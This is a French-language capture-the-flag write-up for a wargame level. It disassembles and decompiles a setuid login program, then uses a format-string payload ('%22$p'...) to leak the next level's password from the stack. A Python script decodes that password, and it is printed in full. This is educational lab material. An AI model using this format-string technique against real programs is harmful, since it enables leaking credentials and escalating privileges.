# level02

```bash
$ ls -l
total 12
-rwsr-s---+ 1 level03 users 9452 Sep 10  2016 level02
$ file level02
level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
$ gdb -q ./level02
Reading symbols from /home/users/level02/level02...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400640  _init
0x0000000000400670  strncmp
0x0000000000400670  strncmp@plt
0x0000000000400680  puts
0x0000000000400680  puts@plt
0x0000000000400690  fread
0x0000000000400690  fread@plt
0x00000000004006a0  fclose
0x00000000004006a0  fclose@plt
0x00000000004006b0  system
0x00000000004006b0  system@plt
0x00000000004006c0  printf
0x00000000004006c0  printf@plt
0x00000000004006d0  strcspn
0x00000000004006d0  strcspn@plt
0x00000000004006e0  __libc_start_main
0x00000000004006e0  __libc_start_main@plt
0x00000000004006f0  fgets
0x00000000004006f0  fgets@plt
0x0000000000400700  fopen
0x0000000000400700  fopen@plt
0x0000000000400710  exit
0x0000000000400710  exit@plt
0x0000000000400720  fwrite
0x0000000000400720  fwrite@plt
0x0000000000400730  _start
0x000000000040075c  call_gmon_start
0x0000000000400780  __do_global_dtors_aux
0x00000000004007f0  frame_dummy
0x0000000000400814  main
0x0000000000400ac0  __libc_csu_init
0x0000000000400b50  __libc_csu_fini
0x0000000000400b60  __do_global_ctors_aux
0x0000000000400b98  _fini
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400814 <+0>:     push   %rbp
   0x0000000000400815 <+1>:     mov    %rsp,%rbp
   0x0000000000400818 <+4>:     sub    $0x120,%rsp
   0x000000000040081f <+11>:    mov    %edi,-0x114(%rbp)
   0x0000000000400825 <+17>:    mov    %rsi,-0x120(%rbp)
   0x000000000040082c <+24>:    lea    -0x70(%rbp),%rdx
   0x0000000000400830 <+28>:    mov    $0x0,%eax
   0x0000000000400835 <+33>:    mov    $0xc,%ecx
   0x000000000040083a <+38>:    mov    %rdx,%rdi
   0x000000000040083d <+41>:    rep stos %rax,%es:(%rdi)
   0x0000000000400840 <+44>:    mov    %rdi,%rdx
   0x0000000000400843 <+47>:    mov    %eax,(%rdx)
   0x0000000000400845 <+49>:    add    $0x4,%rdx
   0x0000000000400849 <+53>:    lea    -0xa0(%rbp),%rdx
   0x0000000000400850 <+60>:    mov    $0x0,%eax
   0x0000000000400855 <+65>:    mov    $0x5,%ecx
   0x000000000040085a <+70>:    mov    %rdx,%rdi
   0x000000000040085d <+73>:    rep stos %rax,%es:(%rdi)
   0x0000000000400860 <+76>:    mov    %rdi,%rdx
   0x0000000000400863 <+79>:    mov    %al,(%rdx)
   0x0000000000400865 <+81>:    add    $0x1,%rdx
   0x0000000000400869 <+85>:    lea    -0x110(%rbp),%rdx
   0x0000000000400870 <+92>:    mov    $0x0,%eax
   0x0000000000400875 <+97>:    mov    $0xc,%ecx
   0x000000000040087a <+102>:   mov    %rdx,%rdi
   0x000000000040087d <+105>:   rep stos %rax,%es:(%rdi)
   0x0000000000400880 <+108>:   mov    %rdi,%rdx
   0x0000000000400883 <+111>:   mov    %eax,(%rdx)
   0x0000000000400885 <+113>:   add    $0x4,%rdx
   0x0000000000400889 <+117>:   movq   $0x0,-0x8(%rbp)
   0x0000000000400891 <+125>:   movl   $0x0,-0xc(%rbp)
   0x0000000000400898 <+132>:   mov    $0x400bb0,%edx
   0x000000000040089d <+137>:   mov    $0x400bb2,%eax
   0x00000000004008a2 <+142>:   mov    %rdx,%rsi
   0x00000000004008a5 <+145>:   mov    %rax,%rdi
   0x00000000004008a8 <+148>:   callq  0x400700 <fopen@plt>
   0x00000000004008ad <+153>:   mov    %rax,-0x8(%rbp)
   0x00000000004008b1 <+157>:   cmpq   $0x0,-0x8(%rbp)
   0x00000000004008b6 <+162>:   jne    0x4008e6 <main+210>
   0x00000000004008b8 <+164>:   mov    0x200991(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x00000000004008bf <+171>:   mov    %rax,%rdx
   0x00000000004008c2 <+174>:   mov    $0x400bd0,%eax
   0x00000000004008c7 <+179>:   mov    %rdx,%rcx
   0x00000000004008ca <+182>:   mov    $0x24,%edx
   0x00000000004008cf <+187>:   mov    $0x1,%esi
   0x00000000004008d4 <+192>:   mov    %rax,%rdi
   0x00000000004008d7 <+195>:   callq  0x400720 <fwrite@plt>
   0x00000000004008dc <+200>:   mov    $0x1,%edi
   0x00000000004008e1 <+205>:   callq  0x400710 <exit@plt>
   0x00000000004008e6 <+210>:   lea    -0xa0(%rbp),%rax
   0x00000000004008ed <+217>:   mov    -0x8(%rbp),%rdx
   0x00000000004008f1 <+221>:   mov    %rdx,%rcx
   0x00000000004008f4 <+224>:   mov    $0x29,%edx
   0x00000000004008f9 <+229>:   mov    $0x1,%esi
   0x00000000004008fe <+234>:   mov    %rax,%rdi
   0x0000000000400901 <+237>:   callq  0x400690 <fread@plt>
   0x0000000000400906 <+242>:   mov    %eax,-0xc(%rbp)
   0x0000000000400909 <+245>:   lea    -0xa0(%rbp),%rax
   0x0000000000400910 <+252>:   mov    $0x400bf5,%esi
   0x0000000000400915 <+257>:   mov    %rax,%rdi
   0x0000000000400918 <+260>:   callq  0x4006d0 <strcspn@plt>
   0x000000000040091d <+265>:   movb   $0x0,-0xa0(%rbp,%rax,1)
   0x0000000000400925 <+273>:   cmpl   $0x29,-0xc(%rbp)
   0x0000000000400929 <+277>:   je     0x40097d <main+361>
   0x000000000040092b <+279>:   mov    0x20091e(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400932 <+286>:   mov    %rax,%rdx
   0x0000000000400935 <+289>:   mov    $0x400bf8,%eax
   0x000000000040093a <+294>:   mov    %rdx,%rcx
   0x000000000040093d <+297>:   mov    $0x24,%edx
   0x0000000000400942 <+302>:   mov    $0x1,%esi
   0x0000000000400947 <+307>:   mov    %rax,%rdi
   0x000000000040094a <+310>:   callq  0x400720 <fwrite@plt>
   0x000000000040094f <+315>:   mov    0x2008fa(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400956 <+322>:   mov    %rax,%rdx
   0x0000000000400959 <+325>:   mov    $0x400bf8,%eax
   0x000000000040095e <+330>:   mov    %rdx,%rcx
   0x0000000000400961 <+333>:   mov    $0x24,%edx
   0x0000000000400966 <+338>:   mov    $0x1,%esi
   0x000000000040096b <+343>:   mov    %rax,%rdi
   0x000000000040096e <+346>:   callq  0x400720 <fwrite@plt>
   0x0000000000400973 <+351>:   mov    $0x1,%edi
   0x0000000000400978 <+356>:   callq  0x400710 <exit@plt>
   0x000000000040097d <+361>:   mov    -0x8(%rbp),%rax
   0x0000000000400981 <+365>:   mov    %rax,%rdi
   0x0000000000400984 <+368>:   callq  0x4006a0 <fclose@plt>
   0x0000000000400989 <+373>:   mov    $0x400c20,%edi
   0x000000000040098e <+378>:   callq  0x400680 <puts@plt>
   0x0000000000400993 <+383>:   mov    $0x400c50,%edi
   0x0000000000400998 <+388>:   callq  0x400680 <puts@plt>
   0x000000000040099d <+393>:   mov    $0x400c80,%edi
   0x00000000004009a2 <+398>:   callq  0x400680 <puts@plt>
   0x00000000004009a7 <+403>:   mov    $0x400cb0,%edi
   0x00000000004009ac <+408>:   callq  0x400680 <puts@plt>
   0x00000000004009b1 <+413>:   mov    $0x400cd9,%eax
   0x00000000004009b6 <+418>:   mov    %rax,%rdi
   0x00000000004009b9 <+421>:   mov    $0x0,%eax
   0x00000000004009be <+426>:   callq  0x4006c0 <printf@plt>
   0x00000000004009c3 <+431>:   mov    0x20087e(%rip),%rax        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x00000000004009ca <+438>:   mov    %rax,%rdx
   0x00000000004009cd <+441>:   lea    -0x70(%rbp),%rax
   0x00000000004009d1 <+445>:   mov    $0x64,%esi
   0x00000000004009d6 <+450>:   mov    %rax,%rdi
   0x00000000004009d9 <+453>:   callq  0x4006f0 <fgets@plt>
   0x00000000004009de <+458>:   lea    -0x70(%rbp),%rax
   0x00000000004009e2 <+462>:   mov    $0x400bf5,%esi
   0x00000000004009e7 <+467>:   mov    %rax,%rdi
   0x00000000004009ea <+470>:   callq  0x4006d0 <strcspn@plt>
   0x00000000004009ef <+475>:   movb   $0x0,-0x70(%rbp,%rax,1)
   0x00000000004009f4 <+480>:   mov    $0x400ce8,%eax
   0x00000000004009f9 <+485>:   mov    %rax,%rdi
   0x00000000004009fc <+488>:   mov    $0x0,%eax
   0x0000000000400a01 <+493>:   callq  0x4006c0 <printf@plt>
   0x0000000000400a06 <+498>:   mov    0x20083b(%rip),%rax        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x0000000000400a0d <+505>:   mov    %rax,%rdx
   0x0000000000400a10 <+508>:   lea    -0x110(%rbp),%rax
   0x0000000000400a17 <+515>:   mov    $0x64,%esi
   0x0000000000400a1c <+520>:   mov    %rax,%rdi
   0x0000000000400a1f <+523>:   callq  0x4006f0 <fgets@plt>
   0x0000000000400a24 <+528>:   lea    -0x110(%rbp),%rax
   0x0000000000400a2b <+535>:   mov    $0x400bf5,%esi
   0x0000000000400a30 <+540>:   mov    %rax,%rdi
   0x0000000000400a33 <+543>:   callq  0x4006d0 <strcspn@plt>
   0x0000000000400a38 <+548>:   movb   $0x0,-0x110(%rbp,%rax,1)
   0x0000000000400a40 <+556>:   mov    $0x400cf8,%edi
   0x0000000000400a45 <+561>:   callq  0x400680 <puts@plt>
   0x0000000000400a4a <+566>:   lea    -0x110(%rbp),%rcx
   0x0000000000400a51 <+573>:   lea    -0xa0(%rbp),%rax
   0x0000000000400a58 <+580>:   mov    $0x29,%edx
   0x0000000000400a5d <+585>:   mov    %rcx,%rsi
   0x0000000000400a60 <+588>:   mov    %rax,%rdi
   0x0000000000400a63 <+591>:   callq  0x400670 <strncmp@plt>
   0x0000000000400a68 <+596>:   test   %eax,%eax
   0x0000000000400a6a <+598>:   jne    0x400a96 <main+642>
   0x0000000000400a6c <+600>:   mov    $0x400d22,%eax
   0x0000000000400a71 <+605>:   lea    -0x70(%rbp),%rdx
   0x0000000000400a75 <+609>:   mov    %rdx,%rsi
   0x0000000000400a78 <+612>:   mov    %rax,%rdi
   0x0000000000400a7b <+615>:   mov    $0x0,%eax
   0x0000000000400a80 <+620>:   callq  0x4006c0 <printf@plt>
   0x0000000000400a85 <+625>:   mov    $0x400d32,%edi
   0x0000000000400a8a <+630>:   callq  0x4006b0 <system@plt>
   0x0000000000400a8f <+635>:   mov    $0x0,%eax
   0x0000000000400a94 <+640>:   leaveq
   0x0000000000400a95 <+641>:   retq
   0x0000000000400a96 <+642>:   lea    -0x70(%rbp),%rax
   0x0000000000400a9a <+646>:   mov    %rax,%rdi
   0x0000000000400a9d <+649>:   mov    $0x0,%eax
   0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt>
   0x0000000000400aa7 <+659>:   mov    $0x400d3a,%edi
   0x0000000000400aac <+664>:   callq  0x400680 <puts@plt>
   0x0000000000400ab1 <+669>:   mov    $0x1,%edi
   0x0000000000400ab6 <+674>:   callq  0x400710 <exit@plt>
End of assembler dump.
```

```bash
# Decompile main
undefined8 main(void)
{
  int iVar1;
  size_t sVar2;
  long lVar3;
  undefined8 *puVar4;
  undefined8 local_118 [14];
  undefined8 local_a8 [6];
  undefined8 local_78 [12];
  int local_14;
  FILE *local_10;

  puVar4 = local_78;
  for (lVar3 = 0xc; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined4 *)puVar4 = 0;
  puVar4 = local_a8;
  for (lVar3 = 5; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined *)puVar4 = 0;
  puVar4 = local_118;
  for (lVar3 = 0xc; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined4 *)puVar4 = 0;
  local_10 = (FILE *)0x0;
  local_14 = 0;
  local_10 = fopen("/home/users/level03/.pass","r");
  if (local_10 == (FILE *)0x0) {
    fwrite("ERROR: failed to open password file\n",1,0x24,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  sVar2 = fread(local_a8,1,0x29,local_10);
  local_14 = (int)sVar2;
  sVar2 = strcspn((char *)local_a8,"\n");
  *(undefined *)((long)local_a8 + sVar2) = 0;
  if (local_14 != 0x29) {
    fwrite("ERROR: failed to read password file\n",1,0x24,stderr);
    fwrite("ERROR: failed to read password file\n",1,0x24,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fclose(local_10);
  puts("===== [ Secure Access System v1.0 ] =====");
  puts("/***************************************\\");
  puts("| You must login to access this system. |");
  puts("\\**************************************/");
  printf("--[ Username: ");
  fgets((char *)local_78,100,stdin);
  sVar2 = strcspn((char *)local_78,"\n");
  *(undefined *)((long)local_78 + sVar2) = 0;
  printf("--[ Password: ");
  fgets((char *)local_118,100,stdin);
  sVar2 = strcspn((char *)local_118,"\n");
  *(undefined *)((long)local_118 + sVar2) = 0;
  puts("*****************************************");
  iVar1 = strncmp((char *)local_a8,(char *)local_118,0x29);
  if (iVar1 == 0) {
    printf("Greetings, %s!\n",local_78);
    system("/bin/sh");
    return 0;
  }
  printf((char *)local_78);
  puts(" does not have access!");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

Le programme demande un `Username` et un `Passowrd` puis affiche le `Username` avec un printf sans protection nous pouvons donc afficher des éléments de la stack (`%p`, `%x` et des `xx$`)

```bash
$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAA
--[ Password: BBBB
*****************************************
AAAA does not have access!
```

```bash
# Le contenu du fichier .pass est a $rbp - 0xa0
0x00000000004008e6 <+210>:   lea    -0xa0(%rbp),%rax
...
# Le contenu de username est a $rbp - 0x70
0x00000000004009cd <+441>:   lea    -0x70(%rbp),%rax
```

0xa0 - 0x70 = 48

48 / 8 = 6 (`%p` représente 8bits)

Il nous faut maintenant l’offset du printf, pour ca nous allons afficher des `%x` jusqu'à ce qui affiche la valeur hexadécimal de `%x` (`25207825`)

```bash
$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
--[ Password:
*****************************************
ffffe4f0 0 0 2a2a2a2a 2a2a2a2a ffffe6e8 f7ff9a08 0 0 0 0 0 0 0 0 0 0 0 0 0 0 34376848 61733951 574e6758 6e475873 664b394d 0 25207825 does not have access!
```

Nous avons un `offset` de 28, nous devons revenir 6 adresse en arrière ce qui donne 22 (28 - 6)

Il faut afficher 5 fois `%p` car le flag fait 40 char (40 / 8) en commençant a 22

```bash
$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p%23$p%24$p%25$p%26$p
--[ Password:
*****************************************
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!
```

Maintenant il faut convertir la sortie en ASCII (Reverse Endian)

```bash
$ nano /tmp/convert.py
import sys

if len(sys.argv) > 1:
        str = sys.argv[1]
else:
        str = raw_input("hex: ")

decoded_parts = []
for part in str.split("0x"):
        decoded_parts.append(part.decode("hex")[::-1])

print("FLAG: " + "".join(decoded_parts))

# from argv
$ python /tmp/convert.py 0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
FLAG: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
# or from input
$ python /tmp/convert.py
hex: 0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
FLAG: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

FLAG: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

You can do it faster with this website : [CyberChef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',8,true)From_Hex('Auto')&input=MHg3NTZlNTA1MjM0Mzc2ODQ4LjB4NDU0MTRhMzU2MTczMzk1MS4weDM3N2E3MTQzNTc0ZTY3NTguMHgzNTRhMzU2ODZlNDc1ODczLjB4NDgzMzY3NTA2NjRiMzk0ZA)